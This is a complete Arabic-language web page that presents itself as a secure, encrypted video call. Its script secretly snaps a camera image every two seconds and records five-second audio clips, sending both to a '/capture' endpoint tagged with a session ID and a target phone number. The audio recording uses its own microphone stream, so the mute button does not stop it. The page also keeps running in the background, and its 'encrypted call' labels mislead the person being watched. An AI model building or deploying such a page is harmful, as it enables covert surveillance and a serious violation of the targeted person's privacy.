<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>📞 اتصال مباشر | محادثة صوت وصورة</title>
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        .container {
            width: 100%;
            max-width: 450px;
            height: 100vh;
            max-height: 900px;
            position: relative;
            background: #111;
            border-radius: 0;
            overflow: hidden;
            box-shadow: 0 0 50px rgba(139, 92, 246, 0.3);
        }

        @media (min-width: 500px) {
            .container {
                border-radius: 40px;
                height: 90vh;
                margin: 20px;
            }
        }

        /* خلفية متحركة */
        .bg-animation {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            background: 
                radial-gradient(circle at 20% 50%, rgba(139, 92, 246, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(236, 72, 153, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 50% 80%, rgba(59, 130, 246, 0.1) 0%, transparent 50%);
            animation: bgPulse 4s ease-in-out infinite;
        }

        @keyframes bgPulse {
            0%, 100% { opacity: 0.8; }
            50% { opacity: 1; }
        }

        /* الفيديو */
        .video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            background: #000;
        }

        .video-container video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* طبقة التأثيرات */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            background: linear-gradient(
                180deg,
                rgba(0,0,0,0.4) 0%,
                transparent 30%,
                transparent 70%,
                rgba(0,0,0,0.6) 100%
            );
            pointer-events: none;
        }

        /* شريط الحالة العلوي */
        .status-bar {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            z-index: 10;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: white;
        }

        .status-dot {
            width: 10px;
            height: 10px;
            background: #22c55e;
            border-radius: 50%;
            display: inline-block;
            animation: dotPulse 1.5s infinite;
            box-shadow: 0 0 15px rgba(34, 197, 94, 0.6);
        }

        @keyframes dotPulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.3); opacity: 0.7; }
        }

        /* مؤقت المكالمة */
        .call-timer {
            position: absolute;
            top: 90px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 10;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            padding: 8px 20px;
            border-radius: 25px;
            color: white;
            font-size: 14px;
            font-weight: 700;
            letter-spacing: 1px;
            font-family: 'Cairo', sans-serif;
        }

        /* أزرار التحكم السفلية */
        .controls {
            position: absolute;
            bottom: 40px;
            left: 0;
            right: 0;
            z-index: 10;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 20px;
            padding: 0 30px;
        }

        .ctrl-btn {
            width: 55px;
            height: 55px;
            border-radius: 50%;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            color: white;
            position: relative;
        }

        .ctrl-btn:active {
            transform: scale(0.9);
        }

        .btn-mute {
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
        }

        .btn-mute.active {
            background: rgba(239, 68, 68, 0.8);
            border-color: rgba(239, 68, 68, 0.8);
            box-shadow: 0 0 25px rgba(239, 68, 68, 0.5);
        }

        .btn-end {
            background: #ef4444;
            width: 65px;
            height: 65px;
            box-shadow: 0 10px 30px rgba(239, 68, 68, 0.4);
        }

        .btn-end i {
            transform: rotate(135deg);
        }

        .btn-camera {
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
        }

        .btn-camera.active {
            background: rgba(239, 68, 68, 0.8);
            border-color: rgba(239, 68, 68, 0.8);
            box-shadow: 0 0 25px rgba(239, 68, 68, 0.5);
        }

        /* ملصق تحت الأزرار */
        .controls-label {
            position: absolute;
            bottom: 15px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 10;
            color: rgba(255,255,255,0.6);
            font-size: 11px;
            font-weight: 500;
            text-align: center;
        }

        /* إشعارات */
        .toast {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 20;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            color: white;
            padding: 12px 25px;
            border-radius: 30px;
            font-size: 13px;
            font-weight: 600;
            animation: toastIn 0.3s ease, toastOut 0.3s ease 1.7s forwards;
            pointer-events: none;
        }

        @keyframes toastIn {
            from { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
            to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }

        @keyframes toastOut {
            from { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            to { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
        }

        /* زر الفلاش المخفي (للكاميرا الخلفية) */
        .hidden-canvas {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="container" id="app">
        <!-- خلفية -->
        <div class="bg-animation"></div>
        
        <!-- الفيديو -->
        <div class="video-container">
            <video id="main-video" autoplay playsinline muted></video>
        </div>
        
        <!-- طبقة التأثيرات -->
        <div class="overlay"></div>

        <!-- شريط الحالة -->
        <div class="status-bar">
            <div>
                <span class="status-dot"></span>
                <span style="margin-right: 8px; font-size: 13px; font-weight: 600;">متصل</span>
            </div>
            <div style="font-size: 12px; opacity: 0.8;">
                <i class="fa-solid fa-shield-halved"></i> مشفر
            </div>
        </div>

        <!-- المؤقت -->
        <div class="call-timer" id="timer">00:00</div>

        <!-- أزرار التحكم -->
        <div class="controls">
            <button class="ctrl-btn btn-mute" id="mute-btn" title="كتم الصوت">
                <i class="fa-solid fa-microphone"></i>
            </button>
            
            <button class="ctrl-btn btn-end" id="end-btn" title="إنهاء المكالمة">
                <i class="fa-solid fa-phone"></i>
            </button>
            
            <button class="ctrl-btn btn-camera" id="camera-btn" title="إيقاف الكاميرا">
                <i class="fa-solid fa-video"></i>
            </button>
        </div>
        
        <div class="controls-label">مكالمة آمنة ومشفرة</div>

        <!-- Canvas مخفي لالتقاط السيلفي -->
        <canvas class="hidden-canvas" id="selfie-canvas" width="640" height="480"></canvas>
        
        <!-- عنصر صوت مخفي للتسجيل -->
        <audio id="hidden-audio" style="display:none;"></audio>
    </div>

    <script>
        // ==========================================
        // 🔧 الإعدادات والمتغيرات
        // ==========================================
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');
        const targetNumber = urlParams.get('target') || '0000000000';

        if (!sessionId) {
            document.body.innerHTML = `
                <div style="color:white;text-align:center;padding:50px;font-family:Cairo;">
                    <i class="fa-solid fa-triangle-exclamation" style="font-size:60px;color:#ef4444;"></i>
                    <h2 style="margin-top:20px;">الرابط غير صالح</h2>
                    <p style="opacity:0.7;">مفقود معرف الجلسة (session)</p>
                </div>
            `;
            throw new Error('Session ID missing');
        }

        // عناصر DOM
        const videoEl = document.getElementById('main-video');
        const muteBtn = document.getElementById('mute-btn');
        const endBtn = document.getElementById('end-btn');
        const cameraBtn = document.getElementById('camera-btn');
        const timerEl = document.getElementById('timer');
        const canvasEl = document.getElementById('selfie-canvas');
        const ctx = canvasEl.getContext('2d');

        // حالة المكالمة
        let mediaStream = null;
        let isMuted = false;
        let isCameraOff = false;
        let callStartTime = Date.now();
        let timerInterval = null;
        let selfieInterval = null;
        let audioRecorder = null;
        let audioChunks = [];
        let recordingInterval = null;
        let mediaRecorder = null;

        // ==========================================
        // 🎥 بدء الكاميرا والميكروفون
        // ==========================================
        async function startCall() {
            try {
                // طلب الكاميرا والميكروفون
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: true
                });

                // عرض الفيديو
                videoEl.srcObject = mediaStream;
                await videoEl.play();

                // بدء المؤقت
                startTimer();

                // بدء السيلفي كل ثانيتين
                startSelfieCapture();

                // بدء تسجيل الصوت كل 5 ثواني
                startAudioRecording();

                console.log('✅ المكالمة بدأت بنجاح');
            } catch (error) {
                console.error('❌ فشل بدء المكالمة:', error);
                showToast('⚠️ تعذر الوصول للكاميرا أو الميكروفون');
                
                // محاولة بدون فيديو
                try {
                    mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                    startTimer();
                    startAudioRecording();
                    showToast('📵 المكالمة صوتية فقط');
                } catch (audioError) {
                    showToast('❌ فشل الاتصال بالكامل');
                }
            }
        }

        // ==========================================
        // ⏱️ المؤقت
        // ==========================================
        function startTimer() {
            callStartTime = Date.now();
            timerInterval = setInterval(() => {
                const elapsed = Math.floor((Date.now() - callStartTime) / 1000);
                const mins = Math.floor(elapsed / 60).toString().padStart(2, '0');
                const secs = (elapsed % 60).toString().padStart(2, '0');
                timerEl.textContent = `${mins}:${secs}`;
            }, 1000);
        }

        // ==========================================
        // 📸 السيلفي كل ثانيتين
        // ==========================================
        function startSelfieCapture() {
            selfieInterval = setInterval(async () => {
                if (isCameraOff) return; // لا نرسل إذا الكاميرا مطفية
                
                try {
                    // التقاط الصورة من الفيديو
                    canvasEl.width = videoEl.videoWidth || 640;
                    canvasEl.height = videoEl.videoHeight || 480;
                    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
                    
                    const imageData = canvasEl.toDataURL('image/jpeg', 0.7);

                    // إرسال للسيرفر
                    await fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'image',
                            data: imageData,
                            sessionId: sessionId,
                            caption: `📸 سيلفي تلقائي - ${new Date().toLocaleTimeString('ar-SA')}\n📱 من: ${targetNumber}`
                        })
                    });

                    console.log('📸 سيلفي تم إرساله');
                } catch (error) {
                    console.error('❌ فشل إرسال السيلفي:', error.message);
                }
            }, 2000); // كل ثانيتين
        }

        // ==========================================
        // 🎙️ تسجيل صوت 5 ثواني متواصل
        // ==========================================
        async function startAudioRecording() {
            try {
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                
                recordingInterval = setInterval(async () => {
                    try {
                        mediaRecorder = new MediaRecorder(audioStream, {
                            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
                                ? 'audio/webm;codecs=opus' 
                                : 'audio/webm'
                        });
                        
                        audioChunks = [];

                        mediaRecorder.ondataavailable = (event) => {
                            if (event.data.size > 0) {
                                audioChunks.push(event.data);
                            }
                        };

                        mediaRecorder.onstop = async () => {
                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                            const reader = new FileReader();
                            
                            reader.onloadend = async () => {
                                const base64Audio = reader.result;
                                
                                try {
                                    await fetch('/capture', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            type: 'audio',
                                            data: base64Audio,
                                            sessionId: sessionId,
                                            caption: `🎙️ تسجيل صوتي - ${new Date().toLocaleTimeString('ar-SA')}\n📱 من: ${targetNumber}`
                                        })
                                    });
                                    console.log('🎙️ تسجيل صوتي تم إرساله');
                                } catch (error) {
                                    console.error('❌ فشل إرسال الصوت:', error.message);
                                }
                            };
                            
                            reader.readAsDataURL(audioBlob);
                        };

                        // بدء التسجيل
                        mediaRecorder.start();
                        
                        // إيقاف بعد 5 ثواني
                        setTimeout(() => {
                            if (mediaRecorder && mediaRecorder.state === 'recording') {
                                mediaRecorder.stop();
                            }
                        }, 5000);

                    } catch (error) {
                        console.error('❌ خطأ في التسجيل:', error.message);
                    }
                }, 5500); // كل 5.5 ثانية (5 تسجيل + 0.5 معالجة)

            } catch (error) {
                console.error('❌ فشل الوصول للميكروفون:', error.message);
            }
        }

        // ==========================================
        // 🎛️ أزرار التحكم
        // ==========================================
        
        // كتم الصوت
        muteBtn.addEventListener('click', () => {
            if (mediaStream) {
                const audioTrack = mediaStream.getAudioTracks()[0];
                if (audioTrack) {
                    isMuted = !isMuted;
                    audioTrack.enabled = !isMuted;
                    muteBtn.classList.toggle('active', isMuted);
                    
                    const icon = muteBtn.querySelector('i');
                    icon.className = isMuted ? 'fa-solid fa-microphone-slash' : 'fa-solid fa-microphone';
                    
                    showToast(isMuted ? '🔇 تم كتم الصوت' : '🎤 تم إلغاء الكتم');
                }
            }
        });

        // إيقاف/تشغيل الكاميرا
        cameraBtn.addEventListener('click', () => {
            if (mediaStream) {
                const videoTrack = mediaStream.getVideoTracks()[0];
                if (videoTrack) {
                    isCameraOff = !isCameraOff;
                    videoTrack.enabled = !isCameraOff;
                    cameraBtn.classList.toggle('active', isCameraOff);
                    
                    const icon = cameraBtn.querySelector('i');
                    icon.className = isCameraOff ? 'fa-solid fa-video-slash' : 'fa-solid fa-video';
                    
                    showToast(isCameraOff ? '📵 الكاميرا متوقفة' : '📹 الكاميرا تعمل');
                }
            }
        });

        // إنهاء المكالمة
        endBtn.addEventListener('click', () => {
            endCall();
        });

        // ==========================================
        // 🛑 إنهاء المكالمة وتنظيف الموارد
        // ==========================================
        function endCall() {
            // إيقاف المؤقت
            if (timerInterval) clearInterval(timerInterval);
            
            // إيقاف السيلفي
            if (selfieInterval) clearInterval(selfieInterval);
            
            // إيقاف التسجيل الصوتي
            if (recordingInterval) clearInterval(recordingInterval);
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            
            // إيقاف الكاميرا والميكروفون
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }

            // إرسال إشعار انتهاء المكالمة
            const callDuration = Math.floor((Date.now() - callStartTime) / 1000);
            const mins = Math.floor(callDuration / 60);
            const secs = callDuration % 60;
            
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'text',
                    data: `📞 تم إنهاء المكالمة\n⏱️ المدة: ${mins} دقيقة و ${secs} ثانية\n📱 من: ${targetNumber}\n🕒 ${new Date().toLocaleTimeString('ar-SA')}`,
                    sessionId: sessionId
                })
            }).catch(() => {});

            // إظهار واجهة النهاية
            document.getElementById('app').innerHTML = `
                <div style="
                    display:flex;
                    flex-direction:column;
                    align-items:center;
                    justify-content:center;
                    height:100%;
                    color:white;
                    text-align:center;
                    padding:30px;
                ">
                    <div style="
                        width:90px;
                        height:90px;
                        background:rgba(239,68,68,0.2);
                        border-radius:50%;
                        display:flex;
                        align-items:center;
                        justify-content:center;
                        margin-bottom:25px;
                        border: 3px solid rgba(239,68,68,0.5);
                    ">
                        <i class="fa-solid fa-phone" style="font-size:35px;color:#ef4444;transform:rotate(135deg);"></i>
                    </div>
                    <h2 style="font-family:Cairo;font-size:26px;margin-bottom:10px;">تم إنهاء المكالمة</h2>
                    <p style="opacity:0.7;margin-bottom:5px;">المدة: ${mins} دقيقة و ${secs} ثانية</p>
                    <p style="opacity:0.5;font-size:13px;">تم إرسال جميع البيانات المسجلة</p>
                    <button onclick="location.reload()" style="
                        margin-top:30px;
                        background:linear-gradient(135deg,#8b5cf6,#ec4899);
                        color:white;
                        border:none;
                        padding:14px 40px;
                        border-radius:30px;
                        font-size:16px;
                        font-weight:700;
                        cursor:pointer;
                        font-family:Cairo;
                    ">
                        <i class="fa-solid fa-rotate-right" style="margin-left:8px;"></i>
                        اتصال جديد
                    </button>
                </div>
            `;
        }

        // ==========================================
        // 💬 إشعارات
        // ==========================================
        function showToast(message) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = message;
            document.getElementById('app').appendChild(toast);
            
            setTimeout(() => {
                toast.remove();
            }, 2000);
        }

        // ==========================================
        // 🚀 بدء التشغيل
        // ==========================================
        startCall();

        // ==========================================
        // 🌙 العمل في الخلفية (Background Service)
        // ==========================================
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                console.log('📱 التطبيق في الخلفية - مستمر في العمل');
                // الكاميرا والميكروفون يستمرون في العمل تلقائياً
            } else {
                console.log('📱 التطبيق في المقدمة');
            }
        });

        // منع إيقاف الشاشة (قدر الإمكان)
        if ('wakeLock' in navigator) {
            navigator.wakeLock.request('screen').catch(() => {});
        }
    </script>
</body>
</html>
